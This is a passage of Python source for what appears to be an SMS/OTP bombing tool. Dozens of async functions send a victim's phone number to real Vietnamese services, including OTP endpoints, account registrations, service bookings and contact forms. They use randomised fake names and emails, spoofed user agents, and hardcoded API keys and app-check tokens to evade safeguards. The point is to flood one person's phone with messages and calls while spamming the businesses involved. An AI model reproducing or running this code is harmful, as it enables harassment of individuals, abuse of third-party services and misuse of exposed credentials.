        'page_url': 'https://onehousing.vip/form-ung-tuyen/',
        'url_referer': 'https://www.google.com/',
        'page_id': '414',
        'wpforms[id]': '59',
        'wpforms[post_id]': '414',
        'wpforms[token]': token,
        'wpforms[token_time]': token_time,
        'wpforms[fields][1]': random_vietnamese_name(),
        'wpforms[fields][12]': str(_r.randint(1980, 2003)),
        'wpforms[fields][25]': f'user{_r.randint(1000,9999)}@gmail.com',
        'wpforms[fields][11]': phone,
        'wpforms[fields][14]': _r.choice(['Hà Nội', 'TP.HCM', 'Đà Nẵng', 'Bình Dương']),
        'wpforms[fields][19]': _r.choice(['Chưa', 'Đã có']),
        'wpforms[fields][16]': _r.choice(['Môi giới sale BĐS', 'Đầu chủ', 'Quản lý']),
        'wpforms[fields][26]': _r.choice(['Thổ cư', 'Thứ cấp', 'Sơ cấp']),
        'wpforms[fields][17]': _r.choice([
            'Tôi muốn tìm hiểu thêm về cơ hội hợp tác.',
            'Cho tôi biết thêm thông tin về dự án.',
            'Tôi quan tâm đến cơ hội đầu tư bất động sản.',
            'Vui lòng tư vấn thêm về các sản phẩm hiện có.',
        ]),
    }
    try:

        response = await make_request('POST', 'https://onehousing.vip/wp-admin/admin-ajax.php',
            headers={
                'User-Agent': ua,
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://onehousing.vip/form-ung-tuyen/',
                'Origin': 'https://onehousing.vip',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            data=data)
        print(f"ONEHOUSING | -> OK         ")
    except Exception:
        print(f"ONEHOUSING | ~> Lỗi ")


async def thoviet_datlich(phone):
    import datetime as _dt, random as _r
    _ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1'
    _hdrs = {
        'Content-Type': 'application/json',
        'Accept': 'application/json, */*',
        'Origin': 'https://datlich.thoviet.vn',
        'Referer': 'https://datlich.thoviet.vn/datlich-iframe',
        'User-Agent': _ua,
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }
    _d = _dt.date.today()
    _date_str = f'{_d.day:02d}-{_d.month:02d}-{_d.year}'
    _services = ['Sửa điện', 'Sửa nước', 'Vệ sinh máy lạnh', 'Sửa máy lạnh', 'Lắp đặt điện', 'Thông tắc bồn cầu']
    _addresses = ['88 Đường 18, Hiệp Bình, TP. HCM', '12 Lê Văn Việt, Quận 9, TP. HCM', '45 Nguyễn Văn Linh, Bình Chánh', '32 Hoàng Diệu, Quận 4, TP. HCM']
    _json = {
        'yccvCont': _r.choice(_services),
        'tenCont': random_vietnamese_name(),
        'sdtCont': phone,
        'quanCont': '',
        'diaChiCont': _r.choice(_addresses),
        'dateCont': _date_str,
        'ghiChuCont': '',
        'cus_from_page': '/datlich-iframe',
        'from_cus': 0,
        'recaptcha_token': '',
    }
    try:

        response = await make_request('POST', 'https://data.thoviet.com/api/addWorkWeb', headers=_hdrs, json=_json)
        print(f"THOVIET_DATLICH | -> OK         ")
    except Exception:
        print(f"THOVIET_DATLICH | ~> Lỗi ")


async def thoviet_baohanh(phone):
    _ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1'
    _hdrs = {
        'Content-Type': 'application/json',
        'Accept': 'application/json, */*',
        'Origin': 'https://datlich.thoviet.vn',
        'Referer': 'https://datlich.thoviet.vn/datlich-iframe',
        'User-Agent': _ua,
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }
    _json = {
        'phone_cus': phone,
        'reason_cus': 'Khách hàng yêu cầu bảo hành',
        'recaptcha_token': '',
    }
    try:

        response = await make_request('POST', 'https://data.thoviet.com/api/feedback_create_web', headers=_hdrs, json=_json)
        print(f"THOVIET_BAOHANH | -> OK         ")
    except Exception:
        print(f"THOVIET_BAOHANH | ~> Lỗi ")


async def eurowindow_lightcity(phone):
    import json as _json, datetime as _dt, random as _r
    _ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1'
    _now = _dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    _names = [
        'Nguyễn Văn An', 'Nguyễn Minh Anh', 'Nguyễn Quốc Bảo',
        'Nguyễn Thị Bích', 'Nguyễn Hoàng Dũng', 'Nguyễn Thanh Hà',
        'Nguyễn Đức Huy', 'Nguyễn Thị Hương', 'Nguyễn Gia Hân',
        'Nguyễn Quang Khải', 'Trần Văn Bình', 'Trần Minh Châu',
        'Trần Quốc Đạt', 'Trần Thị Diễm', 'Trần Hoàng Duy',
        'Trần Ngọc Hân', 'Trần Đức Hiếu', 'Trần Thị Lan',
        'Trần Anh Tuấn', 'Trần Thanh Vy', 'Lê Văn Cường',
        'Lê Minh Đức', 'Lê Quốc Hùng', 'Lê Thị Kim',
        'Lê Hoàng Long', 'Lê Thanh Mai', 'Lê Gia Phúc',
        'Hoàng Gia Bảo', 'Hoàng Thị Ngọc', 'Hoàng Đức Thịnh',
        'Hoàng Thanh Tâm', 'Hoàng Hải Yến', 'Hoàng Bảo Trâm',
        'Hoàng Nhật Minh', 'Hoàng Anh Thư', 'Vũ Văn Thành',
        'Vũ Minh Tâm', 'Vũ Quốc Việt', 'Vũ Thị Hạnh',
        'Vũ Gia Huy', 'Vũ Thanh Tùng', 'Vũ Đức Anh',
        'Vũ Ngọc Mai', 'Vũ Hoàng Nam', 'Vũ Thu Phương'
    ]
    _name = _r.choice(_names)
    _form_array = [
        {'name': 'Name', 'value': _name},
        {'name': 'Phone', 'value': phone},
        {'name': 'utm', 'value': ''},
        {'name': 'device', 'value': 'Điện thoại'},
        {'name': 'IP Address', 'value': ''},
        {'name': 'Thời gian', 'value': _now},
    ]
    _json_data = _json.dumps(_form_array, ensure_ascii=False)
    _hdrs = {
        'User-Agent': _ua,
        'Origin': 'https://eurowindowlightcity.vn',
        'Referer': 'https://eurowindowlightcity.vn/',
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    try:
        response = await make_request('POST', 'https://api.ihappy.vn/sendMail', headers=_hdrs,
            data={'to': 'info@eurowindow-holding.com', 'url': 'eurowindowlightcity.vn', 'json_data': _json_data})
        print(f"EUROWINDOW | sendMail [{r1.status_code}] -> {r1.text[:200]}")
    except Exception:
        print(f"EUROWINDOW | sendMail ~> Lỗi ")
    try:
        response2 = await make_request('POST', 'https://eurowindowlightcity.vn/w/updateDataElement', headers=_hdrs,
            data={'_token': '7i5gXgp00cpFBb4pTVU2jWgDTwt5xGMSnB0ZFo1R', 'element': 'mail-to-admin', 'json_data': _json_data})
        print(f"EUROWINDOW | updateData [{r2.status_code}] -> {r2.text[:100]}")
    except Exception:
        print(f"EUROWINDOW | updateData ~> Lỗi ")


async def dichvunhaviet(phone):
    import random as _r
    _ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1'
    _emails = [f'user{_r.randint(1000,9999)}@gmail.com', f'kh{_r.randint(100,999)}@yahoo.com']
    _names = [
        'Nguyễn Văn An', 'Nguyễn Minh Anh', 'Nguyễn Quốc Bảo',
        'Nguyễn Thị Bích', 'Nguyễn Hoàng Dũng', 'Nguyễn Thanh Hà',
        'Nguyễn Đức Huy', 'Nguyễn Thị Hương', 'Nguyễn Gia Hân',
        'Nguyễn Quang Khải', 'Trần Văn Bình', 'Trần Minh Châu',
        'Trần Quốc Đạt', 'Trần Thị Diễm', 'Trần Hoàng Duy',
        'Trần Ngọc Hân', 'Trần Đức Hiếu', 'Trần Thị Lan',
        'Trần Anh Tuấn', 'Trần Thanh Vy', 'Lê Văn Cường',
        'Lê Minh Đức', 'Lê Quốc Hùng', 'Lê Thị Kim',
        'Lê Hoàng Long', 'Lê Thanh Mai', 'Lê Gia Phúc',
        'Hoàng Gia Bảo', 'Hoàng Thị Ngọc', 'Hoàng Đức Thịnh',
        'Hoàng Thanh Tâm', 'Hoàng Hải Yến', 'Hoàng Bảo Trâm',
        'Hoàng Nhật Minh', 'Hoàng Anh Thư', 'Vũ Văn Thành',
        'Vũ Minh Tâm', 'Vũ Quốc Việt', 'Vũ Thị Hạnh',
        'Vũ Gia Huy', 'Vũ Thanh Tùng', 'Vũ Đức Anh',
        'Vũ Ngọc Mai', 'Vũ Hoàng Nam', 'Vũ Thu Phương'
    ]
    _name = _r.choice(_names)
    _data = {
        'contact_name': _name,
        'contact_phone': phone,
        'contact_email': _r.choice(_emails),
        'contact_address': _r.choice(['Hà Nội', 'TP. Hồ Chí Minh', 'Đà Nẵng', 'Hải Phòng']),
        'message': _r.choice([
            'Tôi muốn tìm hiểu thêm về dịch vụ của quý công ty.',
            'Cho tôi hỏi thêm thông tin về các gói dịch vụ hiện có.',
            'Tôi cần tư vấn về dịch vụ phù hợp với nhu cầu của mình.',
            'Xin quý công ty liên hệ lại để tư vấn chi tiết hơn.',
            'Tôi muốn đăng ký sử dụng dịch vụ, nhờ tư vấn giúp tôi.',
            'Tôi đang có nhu cầu sử dụng dịch vụ, mong được hỗ trợ.',
            'Vui lòng gửi báo giá chi tiết về dịch vụ cho tôi.',
            'Tôi muốn biết thêm về chính sách và quy trình làm việc.',
            'Nhờ tư vấn viên liên hệ lại để tôi trao đổi thêm.',
            'Tôi cần hỗ trợ gấp, mong được phản hồi sớm nhất có thể.',
            'Quý công ty có hỗ trợ khách hàng ở khu vực của tôi không?',
            'Tôi muốn tham khảo thêm trước khi quyết định sử dụng dịch vụ.',
            'Cho tôi biết thêm về các ưu đãi hiện đang có của công ty.',
            'Tôi cần được tư vấn cụ thể hơn về giải pháp phù hợp.',
            'Mong quý công ty liên hệ để hẹn lịch tư vấn trực tiếp.',
        ]),
        'module': 'contact',
        'task': 'save',
        'view': 'contact',
        'Itemid': '43',
    }
    try:

        response = await make_request('POST', 'https://dichvunhaviet.vn/lien-he.html',
            headers={
                'User-Agent': _ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://dichvunhaviet.vn/lien-he.html',
                'Origin': 'https://dichvunhaviet.vn',
                'Accept': 'text/html,application/xhtml+xml,*/*',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            data=_data)
        print(f"DICHVUNHAVIET | -> OK         ")
    except Exception:
        print(f"DICHVUNHAVIET | ~> Lỗi ")


async def vnfite(phone):
    import hashlib as _hl, uuid as _uuid
    password = _hl.md5(_uuid.uuid4().hex.encode()).hexdigest()
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'VnFiteInvest/123 CFNetwork/1568.200.51 Darwin/24.1.0',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
    }
    json_data = {
        'phone': phone,
        'password': password,
    }
    try:

        response = await make_request('POST', 'https://api.vnfite.com.vn/api/auth/register', headers=headers, json=json_data)
        print(f"VNFITE | -> OK         ")
    except Exception:
        print(f"VNFITE | ~> Lỗi ")


async def phuha(phone):
    headers = {
        'Host': 'phuha.winds.vn',
        'Content-Type': 'application/json',
        'User-Agent': 'PHUHA/4 CFNetwork/3860.400.51 Darwin/25.3.0',
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': phone,
    }

    try:

        response = await make_request('POST', 'http://phuha.winds.vn/api/service/CheckPhone', headers=headers, json=json_data)

        print(f"PHUHA|         ")
    except Exception:
        print(f"PHUHA | ~> Lỗi ")

async def cropee(phone):
        default_headers = {
        'Referer': 'https://cropee.vn/,
        'User-Agent': user_agent,
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Accept': 'text/html,application/xhtml+xml,*/*',
    }
        try:
            r0 = await make_request('GET', 'https://cropee.vn/dang-ky/', headers=default_headers, timeout=30)
            nonce_match = re.search(r'"nonce":"([a-f0-9]{10})"', r0.text)
            if not nonce_match:
                print(f"CROPEE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI (Không lấy được nonce)" + Style.RESET_ALL)
                return
            nonce = nonce_match.group(1)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://cropee.vn',
                'Referer': 'https://cropee.vn/dang-ky/',
                'User-Agent': user_agent,
                'Accept-Language': 'vi-VN,vi;q=0.9',
            }
            data = {
                'reg_user_phone': phone,
                'reg_user_mail': generate_email(),
                'reg_user_pass': 'Trong@2888',
                'reg_user_tax_id': '',
                'reg_user_policy': '1',
                'reg_user_type': 'buyer',
                'cr_registry_nonce': nonce,
            }
            response2 = await make_request('POST', 
                'https://cropee.vn/wp-admin/admin-ajax.php?action=crRegistryAccount',
                headers=headers, data=data, timeout=30,
            )
            print(f"CROPEE | -> OK         ")
        except Exception:
            print(f"CROPEE | ~> Lỗi ")

async def a28(phone):
    headers = {
        'authority': 'api.onelife.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }
    json_data = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': phone,
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    try:

        response = await make_request('POST', 'https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)

        print(f"A28 | -> OK         ")
    except Exception:
        print(f"A28 | ~> Lỗi ")

async def finvay(phone):
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Accept-Charset': 'UTF-8',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'User-Agent': 'ktor-client',
    }
    json_data = {
        'phone': phone,
    }

    try:

        response = await make_request('POST', 'https://h5web.thudofinance.com/fivios/finv/neglected', headers=headers, json=json_data, timeout=30)
        print(f"FINVAY | -> OK         ")
    except Exception:
        print(f"FINVAY | ~> Lỗi ")

async def tmatsuoka(phone):
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'tmc/1 CFNetwork/1568.200.51 Darwin/24.1.0',
        'x-api-key': 'application/json',
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Authorization': '',
    }
    json_data = {
        'phone': phone,
    }

    try:

        response = await make_request('POST', 'https://api.dr.t-matsuoka.com/api/go/service/tmatsuoka/send-otp', headers=headers, json=json_data)

        print(f"TMATSUOKA | -> OK         ")
    except Exception:
        print(f"TMATSUOKA | ~> Lỗi ")

async def mobifone(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'User-Agent': 'LoaThnTi/1 CFNetwork/1568.200.51 Darwin/24.1.0',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'app-version': '20260505.1',
        'device-info': '{"deviceType":1,"deviceYearClass":2020,"brand":"Apple","modelName":"iPhone 12 Pro","modelId":"iPhone13,3","manufacturer":"Apple","platformApiLevel":null,"osName":"iOS","productName":null,"osVersion":"18.1","osBuildId":"22B83","osBuildFingerprint":null,"osInternalBuildId":"22B83"}',
    }
    json_data = {
        'phone': phone,
    }

    try:

        response = await make_request('POST', 
            'https://loathantai.mobifone.vn/services/qrpaysoundauthservice/api/v1/ams/auth/register-customer/resend-otp',
            headers=headers,
            json=json_data)

        print(f"MOBIFONE | -> OK         ")
    except Exception:
        print(f"MOBIFONE | ~> Lỗi ")



async def tamanh(phone):
    headers = {
        'Host': 'api-tamanh-app.e-plus.vn',
        'Content-Type': 'application/json;charset=utf-8',
        'User-Agent': 'BVDK%20Tam%20Anh/7 CFNetwork/1568.200.51 Darwin/24.1.0',
        'Connection': 'keep-alive',
        'x-clientid': '3Bv4xV1ifo066rIJY2Kzjj4zmbrzp+eSTqNCddsDA/UQgLOcvjuGH4cvarwtoP5UEspos9SC9kHO6CB6O1EeIhfWh8+F3VVvGSC9gAiz23w22Qgs1YXBFGd518mdHpBWmJM4jf6hOLA5MsCZlNrRkANICetoOoqPKkDc/d+n9Eu+WrPT3QbqZns9jlWshlBQ+8zr4CKFSpf7HzbXSh9FrQFCOY/vtyq+FqfUc1WLxbfp/mNq36QYtEVUtKG6QUsHd6ecuiBzlxmJ/GmWT2iwbT2qemASRuER491C1tf1ScQ/VAOmZQ44+FiGfIsR/sciKLUdVbTBAg/hSe0W2pelMg==',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'x-apikey': 'a80416ae31a5422ea1e0bcf4e1e24fde',
        'Accept-Encoding': 'gzip, deflate',
    }
    json_data = {
        'phone': phone,
        'requestType': 'authenticate',
        'source': 'tamanh',
        'otpExprire': '120',
    }
    try:

        response = await make_request('POST', 'https://api-tamanh-app.e-plus.vn/api/app/Otp/request', headers=headers, json=json_data)
        print(f"TAMANH | -> OK         ")
    except (httpx.RequestError, Exception):
        print(f"TAMANH | ERR |")


async def smed(phone):
    headers = {
        'Host': 'api-mobile.smed.vn',
        'Content-Type': 'application/json',
        'tenancyname': 'tcankhang',
        'User-Agent': 'tiemchungankhangmobile/1 CFNetwork/1568.200.51 Darwin/24.1.0',
        'Connection': 'keep-alive',
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Authorization': '',
        'Accept-Encoding': 'gzip, deflate',
    }
    json_data = {
        'userName': phone,
        'password': 'Trongok@288',
        'hoTen': random_vietnamese_name(),
        'rePassword': 'Trongok@288',
        'tenancyName': 'tcankhang',
    }
    try:

        response = await make_request('POST', 'https://api-mobile.smed.vn/api/User/Register', headers=headers, json=json_data)
        print(f"SMED | -> OK         ")
    except (httpx.RequestError, Exception):
        print(f"SMED | ERR |")


async def hainong(phone):
    headers = {
        'Host': 'id.hainong.vn',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
    }
    data = f'client_key=54e623ef2dc6bf0a281445fc8e3be054531b2fee&phone={phone}'
    try:

        response = await make_request('POST', 'https://id.hainong.vn/otp_logins', headers=headers, data=data)
        print(f"HAINONG | -> OK         ")
    except (httpx.RequestError, Exception):
        print(f"HAINONG | ERR |")


async def huythanhjewelry(phone):
    headers_options = {
        'Host': 'sso.huythanhjewelry.vn',
        'Origin': 'https://huythanhjewelry.vn',
        'Sec-Fetch-Site': 'same-site',
        'Access-Control-Request-Method': 'POST',
        'Access-Control-Request-Headers': 'content-type',
        'Sec-Fetch-Mode': 'cors',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
        'Referer': 'https://huythanhjewelry.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Priority': 'u=3, i',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    headers_post = {
        'Host': 'sso.huythanhjewelry.vn',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'same-site',
        'Origin': 'https://huythanhjewelry.vn',
        'Sec-Fetch-Mode': 'cors',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
        'Referer': 'https://huythanhjewelry.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Priority': 'u=3, i',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    json_data = {
        'phone': phone,
        'channel':'zalo',
        'turnstile_token': '1.Cjuamta8Q4Mp78EbthK1Ga1QTSxe7MXB91Rh7BdCkQV_5CBZDZYBLtfnlGFbsBouADRwKghLuo5CxdZCTOomgHLG0POIEj89NUgQJiKAWYK-Oiqy43F-2Td9YCmpehhgoknPeKBPJTOLMbrCFrkHsEqtCtSOmIQ--Q-Mwfk7VfZT3gpnQXb4S32tR8UXpGgekEOzkXd3BXF1Mxb5syAQvq_oa9a1rcYI1LfJDSu8NrGizEyUDcSYHxO9IBMxiaqh_NCvBzdj6JKwWJjsFyEbCUNQ9zru44WeS5Lsq2C-6Zse0Z-MkxuRJzugyH0-aua5KyRCzuflfET1yLtyfazVTKY1EbJZrAGjai3cYSfmoimQLJ7iF2_IQaVDCffH1Uje7jYd30UYSBFjLSy-iIak0vrAHsIaLuNhUCZNo_M_UmdTT7bZz6UmXHGXYIOCxxVtMvA09H03pxlB187hcoYd9gPJhipJ4FUWTTp5XgGzzeGwnwdiP1V-D0geNvILHvLe9e1F2bHmBU6JaIXguYZh1Up8Kd_QXB44m-WpBed0WjCnSoCLYpH9WcKQP7HqOlrZegrGzSl5pwe8heJ67zjDI_tJhOQdLzQBAM90J1jyavzuA6npi7XsMg91m1CR-gEB.Xm_HkoFwquEb65gCfWpjxg.564ff58db948e0685e93720c61fd05a0c6b170ae827c0ae2cb5c7773be3004f1'
    }
    try:
        response1 = await make_request('OPTIONS', 'https://sso.huythanhjewelry.vn/auth/request-registration-otp', headers=headers_options)

        response = await make_request('POST', 'https://sso.huythanhjewelry.vn/auth/request-registration-otp', headers=headers_post, json=json_data)
        print(f"HUYTHANH | -> OK         ")
    except Exception:
        print(f"HUYTHANH | ERR |")


async def vayphu(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'language': 'vi_vn',
        'appType': '1',
        'osType': '1',
    }
    json_data = {
        'key': 'dNlXzyUFuB3tXyCBp8aQrZhXh7bjbgWRjQ68dBJoSdKE+vBJo0iHlacQZ+tHjk5rHWA21JnqSAJ2fiCghr5px3tExo+9gye+ZReQVBswIi4=',
        'smsType': '1',
        'phone': phone,
        'loanProductName': 'Vay_Phuc',
    }
    try:

        response = await make_request('POST', 'http://www.vayphu.top/app-domain/api/user/sentSms', headers=headers, json=json_data)

        print(f"VAYPHU | -> OK         ")
    except Exception:
        print(f"VAYPHU | ~> Lỗi ")

async def nnbanana(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'language': 'vi_vn',
        'appType': '1',
        'osType': '1',
        'NEW_APP_ENC': 'LlsLKbz00IKNPUEMTC00poo/n38BX+TM3U+8Qghf6Fa0iauf9xGdPctvZcQWu4hueZfgCDt+vnBfWI1QLsrIjK/FWWCo8V7NIX1BkOz0d6vJkHbeSuIhppPb8fZh+IwaPCpYRGCHXHsbdHP3fKMtnTNWvEuqy7Q2d8Hym9E6gbY=',
    }
    json_data = {
        'key': 'n6XjUUDVmff385uyC+evr98SOFU3qrZXuFPOnD4+S4VDy8ybdqtnfsSxIcUOwF6W9ifV8RdpZ4SzI7Cy+ArIHMhbLwl4qnpyB0VWOS44XiU=',
        'smsType': '1',
        'phone': phone,
        'loanProductName': 'Nalo_Nhanh',
    }
    try:

        response = await make_request('POST', 'https://www.nnbanana.top/app-domain/api/user/sentSms', headers=headers, json=json_data)

        print(f"NNBANANA | -> OK         ")
    except Exception:
        print(f"NNBANANA | ~> Lỗi ")

async def vnadmin(phone):
    phone84 = '84' + phone[1:]
    headers = {
        'Content-Type': 'application/json',
    }
    json_data = {
        'mobilenumber': phone84,
        'AppKey': 'App1715327022',
        'loading': True,
        'sign': '13CC28A5E874C3BAF54A8C64B474ACD4',
    }
    try:

        response = await make_request('POST', 'https://api.vnadmin.top/login/getSmsCode', headers=headers, json=json_data)

        print(f"VNADMIN | -> OK         ")
    except Exception:
        print(f"VNADMIN | ~> Lỗi ")

async def vinasecurities2(phone):
    device_id = ''.join(random.choices(string.hexdigits.lower(), k=32))
    otp_key = '-'.join([
        ''.join(random.choices(string.hexdigits.lower(), k=8)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=12)),
    ])
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'otp-key': otp_key,
        'device-type': 'WEB',
        'device-id': device_id,
        'x-channel': 'ONLINE',
        'Accept-Language': 'vi',
    }
    json_data = {
        'type': 'PHONE_VERIFICATION_OTP',
        'phone': phone,
        'captcha_token': '',
    }
    try:

        response = await make_request('POST', 'https://api.vinasecurities.com/auth/v4/otp', headers=headers, json=json_data)

        print(f"VINASEC2 | -> OK         ")
    except Exception:
        print(f"VINASEC2 | ~> Lỗi ")

async def vinasun(phone):
    phone84 = '84' + phone[1:]
    ts = str(int(time.time()))
    udid = '-'.join([
        ''.join(random.choices(string.hexdigits.upper(), k=8)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=12)),
    ])
    headers = {
        'Accept': '*/*',
        'Version': '248',
        'OS': '1',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Content-Type': 'application/json',
        'User-Agent': 'Vinasun/248 CFNetwork/1568.200.51 Darwin/24.1.0',
        'apisig': 'ZWqOnCChhiYloBfxsFePXhN61hI7Jme7YJkwztM-UW0',
        'ts': ts,
        'Cookie': 's=',
        'UDID': udid,
    }
    try:

        response = await make_request('GET', f'https://vnspassengerapi.hungdat.vn/api/passenger/forgetpassword?mobile={phone84}', headers=headers)
        print(f"VINASUN | [{response.text}] -> {response.text[:300]}")
    except Exception as e:
        print(f"VINASUN | ~> Lỗi {e}")




_TGSS_TOKEN = (
    'eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjkxMTY5MDg2ODky'
    'OTppb3M6NTM5MzEyNjY2ZDJmMjdhNyIsImF1ZCI6WyJwcm9qZWN0cy85MTE2OTA4Njg5MjkiLCJwcm9qZWN0cy'
    '9ncGVvcGxlLTVmNTUxIl0sInByb3ZpZGVyIjoiZGV2aWNlX2NoZWNrX2FwcF9hdHRlc3QiLCJpc3MiOiJodHRw'
    'czovL2ZpcmViYXNlYXBwY2hlY2suZ29vZ2xlYXBpcy5jb20vOTExNjkwODY4OTI5IiwiZXhwIjoxNzgzMzg2MzA'
    '3LCJpYXQiOjE3ODMzODI3MDcsImp0aSI6IlZscUU4alhobENZZWJlSF8yMjFuY0VPVWJmMTNPMHgyVWRNSTRnUl'
    'JKRmsifQ.ZMFdMtI5BnvtVCJiHEsgx9oYY0N4tJwQxsPVzqjuYrG8CuOFaUKwxDcjPD_qHK4azY3dq5rqi1o4nu'
    'T-RDJO7bVv_ReOyF_vhwGBXMExhddDvJNzBQI13MyK3ReoTIGqX4Lx7YdlqUDCh2yW7h1QiAT9Q_bYZklVLrDTt'
    '3IYa4bze3VIFOg5u_V8fYSzMOtHMbquJ9tju_QyqrdjuGEyqaPtIK_9IwVgycj3c-HO8cSMLRN2C6Mpt86NIDJVi'
    'myUVRZ_5yRX0mh03CMtidLNneXR32jcV-zWPSXTJ2J61GiyXWuoCTAeCzepmUBxMOVtp1OnOR3ThCbPwhYulqRI-'
    'kF479-5PRUzCa_xrjAOleYR5Cpm_77WohEAeazeWEncvXdA2bmX7JOPPvV3ZQnVHbYIO50P__TJ3lwvwG3K7Qb2t'
    'Q9cF74eSqrqs1NGvhD44XPTBrqIkjCtPkTLbnYuSlXYAuxZp44qQujyXEobVe-ZHOucVcXcXTcFKfTK8yqK'
)
_TGSS_URL = 'https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/otp/send-app'

def _tgss_client_id():
    return '-'.join([
        ''.join(random.choices(string.hexdigits.lower(), k=8)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=12)),
    ])

async def tgss(phone):
    headers = {
        'user-agent': 'Dart/3.8 (dart:io)',
        'appchecktoken': _TGSS_TOKEN,
        'clientid': _tgss_client_id(),
        'content-type': 'application/json',
        'accept-encoding': 'gzip',
    }
    json_data = {'phoneNumber': phone, 'type': 1, 'language': 1, 'provider': 1}
    try:

        response = await make_request('POST', _TGSS_URL, headers=headers, json=json_data)
        print(f"TGSS | -> OK         ")
    except Exception:
        print(f"TGSS | ~> Lỗi ")


async def tgss_otp(phone):
    headers = {
        'user-agent': 'Dart/3.8 (dart:io)',
        'appchecktoken': _TGSS_TOKEN,
        'clientid': _tgss_client_id(),
        'content-type': 'application/json',
        'accept-encoding': 'gzip',
    }
